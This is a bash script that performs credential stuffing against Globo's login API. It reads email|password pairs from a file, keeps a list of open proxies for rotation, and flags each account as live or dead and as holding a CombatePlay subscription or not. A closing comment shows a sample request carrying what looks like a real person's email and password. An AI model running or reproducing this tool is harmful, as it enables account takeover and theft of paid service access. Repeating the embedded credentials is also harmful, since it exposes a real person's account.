#!/bin/bash


IBlack='\033[0;90m'		# Black
IRed='\033[0;91m'		# Red
IGreen='\033[0;92m'		# Green
IYellow='\033[0;93m'	# Yellow
IBlue='\033[0;94m'		# Blue
IPurple='\033[0;95m'	# Purple
ICyan='\033[0;96m'		# Cyan
IWhite='\033[0;97m'		# White
IEnd='\033[0m'			# End

#File argument
input=$1

if ! test -f "$input"
then
	echo -e "$IRed[-]$IEnd Input filename invalid"
	exit
fi

echo -e "$IGreen[+]$IEnd File: $input"

proxy=(
117.212.93.51:37674
45.79.46.57:8139
105.28.113.134:58321
83.167.203.174:54450
62.182.114.164:43741
36.83.100.148:8080
217.30.64.26:53281
221.120.163.250:58088
116.0.0.254:46604
103.79.74.65:53879
195.138.92.152:35245
92.38.46.217:36880
191.252.196.241:80
41.169.151.90:46799
117.196.237.186:36429
77.28.96.206:56644
81.12.92.166:8080
86.110.172.54:40512
37.17.9.28:49976
183.181.26.27:3128
96.80.89.69:8080
201.20.73.77:31071
197.188.222.163:61636
114.199.112.170:23500
181.129.74.58:34999
190.7.141.66:59737
185.64.208.115:53281
5.141.130.13:8080
91.190.85.97:34286
1.10.188.140:43327
37.235.28.33:41353
103.92.212.33:43399
124.41.243.31:30978
95.87.14.47:45522
197.231.196.44:43298
203.215.181.218:56543
103.254.167.74:37650
95.65.73.200:49881
182.23.2.100:49833
54.38.37.42:80
192.140.91.133:50701
170.246.85.106:50991
176.118.49.54:53281
49.247.203.242:8888
27.109.117.226:55667
181.129.140.226:38346
203.77.252.250:57343
202.57.55.194:61811
176.9.103.83:36057
175.41.44.36:52581
193.85.228.178:43036
41.93.47.2:61684
182.52.51.59:38238
124.41.211.40:54424
109.224.1.210:50617
51.254.130.252:8118
187.33.226.82:30102
78.30.226.199:8080
178.236.212.103:80
43.224.8.14:6666
200.85.169.18:33069
118.174.220.164:61858
200.6.172.35:999
36.67.246.50:41026
117.196.236.190:50445
67.209.121.36:80
169.57.157.148:80
37.77.135.126:44497
123.108.201.26:61280
176.212.114.139:39581
103.9.190.243:33699
182.52.87.190:46437
91.109.157.41:53281
88.199.82.68:32110
36.66.98.6:53281
202.166.196.28:50153
154.66.241.27:52004
195.144.219.155:54857
202.91.40.25:53281
136.228.128.14:61158
)

while IFS= read -r line
do
	IFS='|' read -ra RAW <<< "$line"
	r=$(( $RANDOM % ${#proxy[@]} ))
	if [ ! -z "${RAW[0]}" ]
	then
		#result=$(curl -x ${proxy[r]} -s --header "Content-Type: application/json; charset=utf-8" -c cookiefile --request POST --data '{"payload":{"email":"'${RAW[0]}'","password":"'${RAW[1]}'","serviceId":6753},"captcha":""}' https://login.globo.com/api/authentication)
		result=$(curl -s --header "Content-Type: application/json; charset=utf-8" -c cookiefile --request POST --data '{"payload":{"email":"'${RAW[0]}'","password":"'${RAW[1]}'","serviceId":6753},"captcha":""}' https://login.globo.com/api/authentication)
		
		if [[ $result =~ "Authenticated" ]]
		then
			result2=$(curl -s -b cookiefile https://gsatmulti.globo.com/authorize/6753/?url=https%3A%2F%2Fsportv.globo.com%2Fsite%2Fcombate%2Fcanal-combate-24h%2F)
			if [[ $result2 =~ "Operadora ou Venda Direta" || $result2 =~ "Tela não possui produto" ]]
			then
				echo -e "$IBlue[!]$IEnd $line - Live - CombatePlay - Dead - Proxy: ${proxy[r]}"
			else
				echo "Result: $result2"
				echo -e "$IGreen[+]$IEnd $line - Live - CombatePlay - Live - Proxy: ${proxy[r]}"
			fi
		elif [[ $result =~ "BadCredentials" ]]
		then
			echo -e "$IRed[-]$IEnd $line - Dead - Proxy: ${proxy[r]}"
		else 
			echo -e "$IYellow[-]$IEnd Error: $line - Result: $result - Proxy: ${proxy[r]}"
		fi
	else
		echo -e "$IYellow[-]$IEnd Error: Split fail"
	fi
done < "$input"

#curl --header "Content-Type: application/json; charset=utf-8" --request POST --data '{"payload":{"email":"maumauarlan@gmail.com","password":"a1b2z1x2","serviceId":6753},"captcha":""}' https://login.globo.com/api/authentication
#https://gsatmulti.globo.com/authorize/6753/?url=https%3A%2F%2Fsportv.globo.com%2Fsite%2Fcombate%2Fcanal-combate-24h%2F


